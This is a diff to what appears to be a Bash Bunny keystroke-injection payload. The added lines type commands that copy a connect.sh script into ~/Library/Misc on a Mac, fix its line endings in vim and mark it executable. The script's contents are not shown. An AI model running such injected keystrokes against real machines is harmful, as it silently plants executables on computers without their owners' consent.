@@ -22,6 +22,18 @@ Q DELAY 1000
 Q STRING cp /Volumes/BashBunny/payloads/$SWITCH_POSITION/connect.sh \~/Library/Misc
 Q ENTER
 Q DELAY 2000
+Q STRING cd \~/Library/Misc
+Q ENTER
+Q DELAY 500
+Q STRING vim connect.sh
+Q ENTER
+Q DELAY 1000
+Q STRING :set fileformat=unix
+Q ENTER
+Q DELAY 500
+Q STRING :wq
+Q ENTER
+Q DELAY 2000
 Q STRING chmod +x \~/Library/Misc/connect.sh
 Q ENTER
 Q DELAY 1000
